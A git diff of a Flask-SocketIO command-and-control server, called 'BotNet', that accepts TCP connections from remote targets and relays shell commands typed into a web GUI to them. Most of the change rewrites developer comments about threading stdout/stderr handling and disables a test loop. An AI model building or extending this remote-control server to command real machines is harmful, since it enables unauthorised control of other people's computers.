@@ -66,24 +66,32 @@ def index():
 
 
 @socketio.on('send_command', namespace='/bot')
-def send_receive(cmd):
-    raw_output = ''
+def send(cmd):
+    # raw_output = b''
     try:
-        raw_output = allConnections[connected].send(cmd['data'])
+        # raw_output = allConnections[connected].send(cmd['data'])
+        allConnections[connected].send(cmd['data'])
     except:
+        # This emit makes sense since it's exceptional
         emit('response',
              {'stdout': '', 'stderr': 'Client {} no longer connected.'.format(connected), 'user': connected})
-    if raw_output:
-        output = json.loads(raw_output)
-        stdout = output['stdout']
-        stderr = output['stderr']
-        # TODO: the way we will want to do this is to poll for the most recent stdout/stderr sent
-        # from a client and return it as though it was a response, can you send stuff constantly even
-        # if the terminal window didn't send a command?
-        # -Sumner
-        emit('response',
-             {'stdout': stdout[:-1], 'stderr': stderr[:-1], 'user': connected})
+    # Look at the "Emitting from an External Process" section:
+    # https://flask-socketio.readthedocs.io/en/latest/
+    # We will want to "emit from a different process" in the following way:
+    # A thread globally checks all targets for stdout/stderr output, then emits anything they
+    # have said to the appropriate socketio sessions
+    # Therefore the send_receive function should probably only emit the fact that the packets
+    # was successfully sent to the target
+    # -Sumner
 
+    # if raw_output:
+    #     output = json.loads(raw_output)
+    #     stdout = output['stdout']
+    #     stderr = output['stderr']
+    #
+    #     # There will not necessarly be
+    #     emit('response',
+    #          {'stdout': stdout[:-1], 'stderr': stderr[:-1], 'user': connected})
 
 class BotNet(Thread):
     def __init__(self, tcpsock):
@@ -92,7 +100,7 @@ class BotNet(Thread):
 
     def run(self):
         while True:
-            # TODO: does the 5 here limit us to fice simultaneous targets?
+            # TODO: does the 5 here limit us to five simultaneous targets?
             self.tcpsock.listen(5)
             (clientsock, (ip, port)) = self.tcpsock.accept()
             clientformatsock = formatsock.FormatSocket(clientsock)
@@ -106,9 +114,10 @@ class BotNet(Thread):
             allConnections[user] = Bot(clientsock, host_info)
 
             # To test continuous stream, stdout is broken into multiple packets, hangs when waiting
-            allConnections[user].sendStdin('find /usr/local/lib\n')
-            while True:
-                print(allConnections[user].recv())
+
+            # allConnections[user].sendStdin('find /usr/local/lib\n')
+            # while True:
+            #     print(allConnections[user].recv())
 
 # Background thread to check if we've lost any connections
 class BotPinger(Thread):
@@ -137,18 +146,7 @@ class Bot:
         json_str = json.dumps({type:cmd})
         self.sock.send(json_str)
         # TODO: Sumner, need this to return result. Currently hangs.
-
-        # Response: this cannot return a result since sending a command is
-        # not guaranteed to return, we need to instead multithread a send operations
-        # as well as a recv operation
-        # This should be treated like typing into a bash terminal, the moment you hit
-        # enter you are not guarenteed to get anything from stdout, in fact you aren't
-        # guarenteed to ever get anything, but if you do it'll be sent automatically and
-        # we need a thread on recv to deal with it (look into the select library to have one
-        # thread dealing with all the recvs at once for efficiency at low throughput)
-        # To deal with this I would almost recommend having one area of the GUI dedicated to stdout/stderr
-        # and another part dedicated to output from special commands
-        # -Sumner
+        # Response: See slack + "def send_receive(cmd):" for details
 
     def sendStdin(self, cmd):
         self.send(cmd, type="stdin")
@@ -168,5 +166,7 @@ if __name__ == "__main__":
     TCPSOCK.bind((HOST, PORT))
     BotNet(TCPSOCK).start()
     BotPinger().start()
+
+    # TODO: setup helper threads to wait for targets to send stdout/stderr
 
     socketio.run(app, debug=True, use_reloader=False)
